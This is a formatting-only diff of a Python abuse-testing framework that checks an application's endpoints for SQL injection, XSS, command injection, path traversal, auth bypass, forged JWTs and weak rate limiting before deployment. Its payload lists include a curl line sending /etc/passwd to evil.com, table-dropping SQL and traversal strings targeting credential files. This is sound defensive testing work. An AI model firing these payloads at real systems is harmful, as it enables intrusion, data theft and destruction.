@@ -22,6 +22,7 @@ import aiohttp
 @dataclass
 class AttackResult:
     """Result from an abuse test attack"""
+
     attack_name: str
     attack_type: str
     target_endpoint: str
@@ -37,6 +38,7 @@ class AttackResult:
 @dataclass
 class RateLimitTest:
     """Rate limiting test result"""
+
     endpoint: str
     requests_per_second: int
     total_requests: int
@@ -50,7 +52,7 @@ class LUKHASAbuseTestFramework:
     """Comprehensive abuse testing framework"""
 
     def __init__(self, base_url: str, output_dir: Path):
-        self.base_url = base_url.rstrip('/')
+        self.base_url = base_url.rstrip("/")
         self.output_dir = output_dir
         self.output_dir.mkdir(parents=True, exist_ok=True)
         self.timestamp = datetime.datetime.now(datetime.timezone.utc).isoformat()
@@ -69,7 +71,7 @@ class LUKHASAbuseTestFramework:
             "/oidc/.well-known/openid_configuration",
             "/oidc/auth",
             "/oidc/token",
-            "/api/v1/guardian/validate"
+            "/api/v1/guardian/validate",
         ]
 
         # Attack payloads
@@ -79,7 +81,7 @@ class LUKHASAbuseTestFramework:
             "' UNION SELECT * FROM users --",
             "admin'--",
             "' OR 1=1 #",
-            "\"; DROP TABLE users; --"
+            '"; DROP TABLE users; --',
         ]
 
         self.xss_payloads = [
@@ -89,7 +91,7 @@ class LUKHASAbuseTestFramework:
             "'\"><script>alert('XSS')</script>",
             "<svg onload=alert('XSS')>",
             "{{7*7}}",  # Template injection
-            "${7*7}",   # Expression injection
+            "${7*7}",  # Expression injection
         ]
 
         self.command_injection_payloads = [
@@ -98,7 +100,7 @@ class LUKHASAbuseTestFramework:
             "&& cat /etc/passwd",
             "`id`",
             "$(whoami)",
-            "; curl evil.com/steal?data=$(cat /etc/passwd)"
+            "; curl evil.com/steal?data=$(cat /etc/passwd)",
         ]
 
         self.path_traversal_payloads = [
@@ -106,7 +108,7 @@ class LUKHASAbuseTestFramework:
             "..\\..\\windows\\system32\\config\\sam",
             "....//....//etc/passwd",
             "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-            "..%252f..%252fetc%252fpasswd"
+            "..%252f..%252fetc%252fpasswd",
         ]
 
         # Authentication bypass patterns
@@ -114,7 +116,7 @@ class LUKHASAbuseTestFramework:
             {"username": "admin", "password": "admin"},
             {"username": "admin'--", "password": "anything"},
             {"username": "' OR '1'='1", "password": "' OR '1'='1"},
-            {"username": "test\"; DROP TABLE users; --", "password": "test"},
+            {"username": 'test"; DROP TABLE users; --', "password": "test"},
         ]
 
     async def discover_endpoints(self, session: aiohttp.ClientSession) -> List[str]:
@@ -129,7 +131,7 @@ class LUKHASAbuseTestFramework:
             "/openapi.json",
             "/.well-known/openid_configuration",
             "/health",
-            "/metrics"
+            "/metrics",
         ]
 
         for endpoint in discovery_endpoints:
@@ -145,8 +147,7 @@ class LUKHASAbuseTestFramework:
         all_endpoints = list(set(discovered_endpoints + self.test_endpoints))
         return all_endpoints
 
-    async def test_sql_injection(self, session: aiohttp.ClientSession,
-                                endpoint: str) -> List[AttackResult]:
+    async def test_sql_injection(self, session: aiohttp.ClientSession, endpoint: str) -> List[AttackResult]:
         """Test SQL injection vulnerabilities"""
         results = []
 
@@ -164,8 +165,13 @@ class LUKHASAbuseTestFramework:
 
                     # Check for SQL injection indicators
                     sql_error_patterns = [
-                        "sql syntax", "mysql_", "ora-", "postgresql",
-                        "sqlite_", "syntax error", "quoted string not properly terminated"
+                        "sql syntax",
+                        "mysql_",
+                        "ora-",
+                        "postgresql",
+                        "sqlite_",
+                        "syntax error",
+                        "quoted string not properly terminated",
                     ]
 
                     vulnerable = any(pattern in response_text.lower() for pattern in sql_error_patterns)
@@ -183,8 +189,8 @@ class LUKHASAbuseTestFramework:
                         details={
                             "method": "GET",
                             "injection_point": "url_parameters",
-                            "error_patterns_detected": [p for p in sql_error_patterns if p in response_text.lower()]
-                        }
+                            "error_patterns_detected": [p for p in sql_error_patterns if p in response_text.lower()],
+                        },
                     )
                     results.append(result)
 
@@ -211,8 +217,10 @@ class LUKHASAbuseTestFramework:
                             details={
                                 "method": "POST",
                                 "injection_point": "json_body",
-                                "error_patterns_detected": [p for p in sql_error_patterns if p in response_text.lower()]
-                            }
+                                "error_patterns_detected": [
+                                    p for p in sql_error_patterns if p in response_text.lower()
+                                ],
+                            },
                         )
                         results.append(result)
 
@@ -228,14 +236,13 @@ class LUKHASAbuseTestFramework:
                     response_body=str(e)[:500],
                     success=False,
                     blocked_properly=True,  # Assume proper blocking if timeout
-                    details={"error": str(e), "method": "GET"}
+                    details={"error": str(e), "method": "GET"},
                 )
                 results.append(result)
 
         return results
 
-    async def test_xss_vulnerabilities(self, session: aiohttp.ClientSession,
-                                     endpoint: str) -> List[AttackResult]:
+    async def test_xss_vulnerabilities(self, session: aiohttp.ClientSession, endpoint: str) -> List[AttackResult]:
         """Test Cross-Site Scripting vulnerabilities"""
         results = []
 
@@ -266,8 +273,8 @@ class LUKHASAbuseTestFramework:
                         details={
                             "method": "GET",
                             "reflection_detected": vulnerable,
-                            "content_type": response.headers.get("content-type", "")
-                        }
+                            "content_type": response.headers.get("content-type", ""),
+                        },
                     )
                     results.append(result)
 
@@ -282,7 +289,7 @@ class LUKHASAbuseTestFramework:
                     response_body=str(e)[:500],
                     success=False,
                     blocked_properly=True,
-                    details={"error": str(e)}
+                    details={"error": str(e)},
                 )
                 results.append(result)
 
@@ -307,8 +314,9 @@ class LUKHASAbuseTestFramework:
 
                         # Check for successful authentication indicators
                         success_indicators = ["token", "access_token", "success", "welcome"]
-                        vulnerable = (response.status == 200 and
-                                    any(indicator in response_text.lower() for indicator in success_indicators))
+                        vulnerable = response.status == 200 and any(
+                            indicator in response_text.lower() for indicator in success_indicators
+                        )
 
                         result = AttackResult(
                             attack_name=f"Auth Bypass - {bypass_payload['username']}",
@@ -322,8 +330,8 @@ class LUKHASAbuseTestFramework:
                             blocked_properly=not vulnerable and response.status in [401, 403, 422],
                             details={
                                 "method": "POST",
-                                "auth_indicators": [i for i in success_indicators if i in response_text.lower()]
-                            }
+                                "auth_indicators": [i for i in success_indicators if i in response_text.lower()],
+                            },
                         )
                         results.append(result)
 
@@ -338,15 +346,15 @@ class LUKHASAbuseTestFramework:
                         response_body=str(e)[:500],
                         success=False,
                         blocked_properly=True,
-                        details={"error": str(e)}
+                        details={"error": str(e)},
                     )
                     results.append(result)
 
         return results
 
-    async def test_rate_limiting(self, session: aiohttp.ClientSession,
-                                endpoint: str, requests_per_second: int = 100,
-                                duration: int = 10) -> RateLimitTest:
+    async def test_rate_limiting(
+        self, session: aiohttp.ClientSession, endpoint: str, requests_per_second: int = 100, duration: int = 10
+    ) -> RateLimitTest:
         """Test rate limiting effectiveness"""
         print(f"🚀 Testing rate limiting: {endpoint} ({requests_per_second} req/s)")
 
@@ -404,7 +412,7 @@ class LUKHASAbuseTestFramework:
             successful_requests=successful_requests,
             blocked_requests=blocked_requests,
             average_response_time=average_response_time,
-            rate_limit_triggered=rate_limit_triggered
+            rate_limit_triggered=rate_limit_triggered,
         )
 
     async def _make_request(self, session: aiohttp.ClientSession, url: str) -> Tuple[int, float]:
@@ -426,10 +434,8 @@ class LUKHASAbuseTestFramework:
         malicious_jwts = [
             # None algorithm attack
             "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.",
-
             # Manipulated payload (admin user)
             "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.invalid_signature",
-
             # Expired token test
             "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwiZXhwIjoxfQ.invalid_signature",
         ]
@@ -464,8 +470,8 @@ class LUKHASAbuseTestFramework:
                             details={
                                 "method": "GET",
                                 "auth_header": f"Bearer {jwt_token[:30]}...",
-                                "expected_rejection": True
-                            }
+                                "expected_rejection": True,
+                            },
                         )
                         results.append(result)
 
@@ -480,7 +486,7 @@ class LUKHASAbuseTestFramework:
                         response_body=str(e)[:500],
                         success=False,
                         blocked_properly=True,
-                        details={"error": str(e)}
+                        details={"error": str(e)},
                     )
                     results.append(result)
 
@@ -522,8 +528,8 @@ class LUKHASAbuseTestFramework:
                         details={
                             "method": "POST",
                             "payload_size_bytes": len(large_payload),
-                            "response_time_acceptable": response_time < 5000  # 5 seconds max
-                        }
+                            "response_time_acceptable": response_time < 5000,  # 5 seconds max
+                        },
                     )
                     results.append(result)
 
@@ -541,10 +547,7 @@ class LUKHASAbuseTestFramework:
                     response_body=str(e)[:500],
                     success=False,
                     blocked_properly=True,  # Assume protection if timeout
-                    details={
-                        "error": str(e),
-                        "timeout_protection": response_time > 30000
-                    }
+                    details={"error": str(e), "timeout_protection": response_time > 30000},
                 )
                 results.append(result)
 
@@ -575,14 +578,16 @@ class LUKHASAbuseTestFramework:
         rate_limit_effective = all(test.rate_limit_triggered for test in self.rate_limit_results)
 
         # Determine overall security posture
-        critical_vulnerabilities = sum(1 for attack in self.attack_results
-                                     if attack.success and attack.attack_type in
-                                     ["sql_injection", "authentication_bypass", "jwt_manipulation"])
+        critical_vulnerabilities = sum(
+            1
+            for attack in self.attack_results
+            if attack.success and attack.attack_type in ["sql_injection", "authentication_bypass", "jwt_manipulation"]
+        )
 
         deployment_safe = (
-            critical_vulnerabilities == 0 and
-            successful_attacks < total_attacks * 0.1 and  # Less than 10% success rate
-            rate_limit_effective
+            critical_vulnerabilities == 0
+            and successful_attacks < total_attacks * 0.1  # Less than 10% success rate
+            and rate_limit_effective
         )
 
         report = {
@@ -593,7 +598,7 @@ class LUKHASAbuseTestFramework:
                 "base_url": self.base_url,
                 "endpoints_tested": len(set(attack.target_endpoint for attack in self.attack_results)),
                 "attack_types": list(attack_categories.keys()),
-                "total_attacks_performed": total_attacks
+                "total_attacks_performed": total_attacks,
             },
             "security_findings": {
                 "total_attacks": total_attacks,
@@ -601,16 +606,18 @@ class LUKHASAbuseTestFramework:
                 "properly_blocked_attacks": properly_blocked,
                 "success_rate_percent": (successful_attacks / total_attacks * 100) if total_attacks > 0 else 0,
                 "blocking_rate_percent": (properly_blocked / total_attacks * 100) if total_attacks > 0 else 0,
-                "critical_vulnerabilities": critical_vulnerabilities
+                "critical_vulnerabilities": critical_vulnerabilities,
             },
             "attack_categories": attack_categories,
             "rate_limiting_tests": {
                 "tests_performed": len(self.rate_limit_results),
                 "rate_limiting_effective": rate_limit_effective,
-                "average_blocked_percent": sum(
-                    test.blocked_requests / test.total_requests * 100
-                    for test in self.rate_limit_results
-                ) / len(self.rate_limit_results) if self.rate_limit_results else 0
+                "average_blocked_percent": (
+                    sum(test.blocked_requests / test.total_requests * 100 for test in self.rate_limit_results)
+                    / len(self.rate_limit_results)
+                    if self.rate_limit_results
+                    else 0
+                ),
             },
             "compliance_status": {
                 "deployment_safe": deployment_safe,
@@ -618,14 +625,14 @@ class LUKHASAbuseTestFramework:
                 "rate_limiting_configured": rate_limit_effective,
                 "input_validation_effective": attack_categories.get("sql_injection", {}).get("successful", 0) == 0,
                 "authentication_secure": attack_categories.get("authentication_bypass", {}).get("successful", 0) == 0,
-                "jwt_security_configured": attack_categories.get("jwt_manipulation", {}).get("successful", 0) == 0
+                "jwt_security_configured": attack_categories.get("jwt_manipulation", {}).get("successful", 0) == 0,
             },
             "deployment_readiness": "APPROVED" if deployment_safe else "BLOCKED",
             "recommendations": self._generate_security_recommendations(),
             "detailed_results": {
                 "attack_results": [asdict(attack) for attack in self.attack_results],
-                "rate_limit_results": [asdict(test) for test in self.rate_limit_results]
-            }
+                "rate_limit_results": [asdict(test) for test in self.rate_limit_results],
+            },
         }
 
         return report
@@ -634,8 +641,8 @@ class LUKHASAbuseTestFramework:
         """Get current git SHA"""
         try:
             import subprocess
-            result = subprocess.run(["git", "rev-parse", "HEAD"],
-                                   capture_output=True, text=True)
+
+            result = subprocess.run(["git", "rev-parse", "HEAD"], capture_output=True, text=True)
             if result.returncode == 0:
                 return result.stdout.strip()
         except Exception:
@@ -647,18 +654,21 @@ class LUKHASAbuseTestFramework:
         recommendations = []
 
         # Check for critical vulnerabilities
-        sql_injection_found = any(attack.success and attack.attack_type == "sql_injection"
-                                for attack in self.attack_results)
+        sql_injection_found = any(
+            attack.success and attack.attack_type == "sql_injection" for attack in self.attack_results
+        )
         if sql_injection_found:
             recommendations.append("CRITICAL: SQL injection vulnerabilities found - implement parameterized queries")
 
-        auth_bypass_found = any(attack.success and attack.attack_type == "authentication_bypass"
-                              for attack in self.attack_results)
+        auth_bypass_found = any(
+            attack.success and attack.attack_type == "authentication_bypass" for attack in self.attack_results
+        )
         if auth_bypass_found:
             recommendations.append("CRITICAL: Authentication bypass found - review authentication logic")
 
-        jwt_issues_found = any(attack.success and attack.attack_type == "jwt_manipulation"
-                             for attack in self.attack_results)
+        jwt_issues_found = any(
+            attack.success and attack.attack_type == "jwt_manipulation" for attack in self.attack_results
+        )
         if jwt_issues_found:
             recommendations.append("HIGH: JWT security issues found - implement proper token validation")
 
@@ -723,14 +733,18 @@ class LUKHASAbuseTestFramework:
         timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
         report_file = self.output_dir / f"abuse-test-{timestamp}.json"
 
-        with open(report_file, 'w') as f:
+        with open(report_file, "w") as f:
             json.dump(report, f, indent=2)
 
         print("\n📊 Abuse Test Results:")
         print(f"   Total Attacks: {len(self.attack_results)}")
         print(f"   Successful Attacks: {sum(1 for a in self.attack_results if a.success)}")
-        print(f"   Critical Vulnerabilities: {sum(1 for a in self.attack_results if a.success and a.attack_type in ['sql_injection', 'authentication_bypass'])}")
-        print(f"   Rate Limiting Effective: {'✅' if all(t.rate_limit_triggered for t in self.rate_limit_results) else '❌'}")
+        print(
+            f"   Critical Vulnerabilities: {sum(1 for a in self.attack_results if a.success and a.attack_type in ['sql_injection', 'authentication_bypass'])}"
+        )
+        print(
+            f"   Rate Limiting Effective: {'✅' if all(t.rate_limit_triggered for t in self.rate_limit_results) else '❌'}"
+        )
         print(f"   Deployment Status: {report['deployment_readiness']}")
         print(f"💾 Report saved to: {report_file}")
 
@@ -739,10 +753,8 @@ class LUKHASAbuseTestFramework:
 
 def main():
     parser = argparse.ArgumentParser(description="Run LUKHAS abuse testing")
-    parser.add_argument("--base-url", default="http://localhost:8000",
-                       help="Base URL of the application to test")
-    parser.add_argument("--output-dir", default="artifacts",
-                       help="Output directory for reports")
+    parser.add_argument("--base-url", default="http://localhost:8000", help="Base URL of the application to test")
+    parser.add_argument("--output-dir", default="artifacts", help="Output directory for reports")
 
     args = parser.parse_args()
 
